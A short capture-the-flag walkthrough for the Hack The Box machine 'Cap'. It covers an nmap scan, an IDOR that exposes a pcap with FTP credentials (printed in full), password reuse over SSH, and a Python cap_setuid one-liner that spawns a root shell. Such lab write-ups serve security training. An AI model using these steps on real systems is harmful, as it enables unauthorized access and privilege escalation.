# Hackthebox Cap

![cap](/cap.png)

**Operating System** : GNU/Linux

**Difficulty** : Easy

**Points** : 20

**Creator** : InfoSecJack

# Nmap Scan

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-09 20:53 IST
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    gunicorn
```
# Security Snapshot
Going to the security snapshot link in the right panel, we see that it redirects us to `/data/1` and gives us a pcap file showing our connection to the server. Modifying the `1` to `0` we get all the inside server sniffed data.
![cap sniffed data](/cap_server_sniffed_data.png)

From that pcap file, we get the ftp credentials
```
nathan:Buck3tH4TF0RM3!
```

# SSH
Fortunately, nathan has reused the password in SSH, so we can directly login to the server by the same password.

# Getting User Flag
![cap user](/cap_user_flag.png)

# Privilege Escalation
From running linpeas, we find that python3.8 has cap_setuid and we can exploit it to get root using this payload.
```python
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
## Getting root.txt
![cap root](/cap_root_flag.png)
